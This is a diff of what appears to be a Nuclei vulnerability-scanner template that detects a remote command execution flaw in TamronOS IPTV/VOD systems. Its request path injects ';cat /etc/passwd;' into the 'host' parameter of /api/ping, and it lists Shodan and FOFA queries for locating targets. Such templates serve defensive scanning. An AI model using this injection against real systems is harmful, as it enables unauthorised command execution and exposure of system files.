@@ -1,4 +1,5 @@
 id: tamronos-rce
+
 info:
   name: TamronOS IPTV/VOD - Remote Command Execution
   author: pikpikcu
@@ -16,15 +17,19 @@ info:
     shodan-query: title:"TamronOS IPTV系统"
     fofa-query: title="TamronOS IPTV系统"
   tags: tamronos,rce
+
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
+
     matchers-condition: and
     matchers:
+
       - type: regex
         regex:
           - "root:.*:0:0:"
+
       - type: status
         status:
           - 200
